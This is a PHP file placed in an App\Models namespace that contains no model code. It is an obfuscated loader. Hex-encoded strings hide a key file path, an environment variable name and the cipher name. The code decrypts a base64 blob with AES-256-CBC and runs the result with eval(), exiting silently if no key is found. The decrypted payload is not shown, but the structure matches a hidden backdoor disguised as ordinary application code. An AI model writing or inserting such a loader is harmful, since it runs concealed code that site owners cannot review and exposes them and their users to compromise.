<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('yRuU7zHMHd6+kmCL1vTOqw==');

$c=base64_decode(

'z1weHgDCVOb3tUhas8Q6AjvCRqYaAEDB9uvQvjkOuE+4V0AVil8rJCQ9p7T1Bd0TF6InntAdG3Ad' .
'3lcsBooP7gFdaqrJAFl0zoBHDfYgDzHVhcjCx0AxTRqnkcOBmCehU+uY/UQo6T5VxEyC+sruuXpO' .
'knPbsZCw/oFU15f8BLv8c9v0a/RUxXyzTKjLcjQ5ltO5E2YQBpPbrgQpIiAweWQrDPjUVCUU8rQH' .
'icmZH7SXd1fUxNaWgb+wg0+AC41iIHZZdb1jG5GFFctUlQLr54pYnfgDJ8X4Is86mv3ihOAg3wN/' .
'9rFLtlU+nv3KmIe+9WyCDQWp0H0wf7YWDBlWDXyA0Uvb3sFmuGEt8NqqzKEsHw8RF6G6qhH1mmVS' .
'fARO0oJqAzzHhUFi3s9n2JxFnbSGra+I5Jn63LC9Z0pqBqc8DQhQ/8Np5NoZf+3jZL9ZahxV7OLE' .
'4eM/NaFWzrxJfdsyZvAggynW5XulhisOXin7OASjPxJhCDROg+VN6tNo28M2NFBhnTNdJWejqnmS' .
'F4yPtdj/66qiU2m4VKLOAO2Q2uN9tZDgADBH/27ooJtDuoLYZ0ridJP8S6lR4cPF0q3vZN+B9GFX' .
'K6/lEJv9d4QqWHBIaArWG6OV1xykht3eJ7fjKmomwFUY0+rmQd6Sy/AM12zS+VpqB2EYl9LGBhdo' .
'UIdTXLMJ1RnladT65kgw52h2SZn4W0YYpY0AAlo+W93idQybwyc1PF1wD2xfNRRBUVa+DUyOszys' .
'YqgMCptuuQRIWe0tHOFV4pbB5DAwc2umAYxzdsIRYTPHxLbDhJIOrevs0MyssAJkFpoelo3LpAlA' .
'7MPmijYzpCiJvpBKtJ3rcKE3633bjn+KEvogyiSeLRe3Az8PQ2Kze+Y/K/Gxo2jsE6mMsXiM5Ec7' .
'Cegk7mUtaRawRz1PlIZSbAOtVW9Ajm7I9yCEieB05d4fYdfNnefiRMdG5PufUZInnwRpLuSPhduo' .
'jRqOFJHWUHCWZmsYRKYy15B3SdwHZW3pOScbexF1oYuxLwyc3UafuOi0F4fP7uSmVYtJrg43xL4Y' .
'R4AwYvBXH8ldQI+k4263Y2vgoX9ZWFPp5gWt77T/sn+4IiS+ViI600dhwk/jj+e9SUkVG/2I+bYL' .
'tcdU1p8hMOPPtJ60EFHva8u+g8317mBZO5iUvsVQVjJnGTf3Gw6vK/yeMIiZmuyiTg1xi9QF9H5S'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

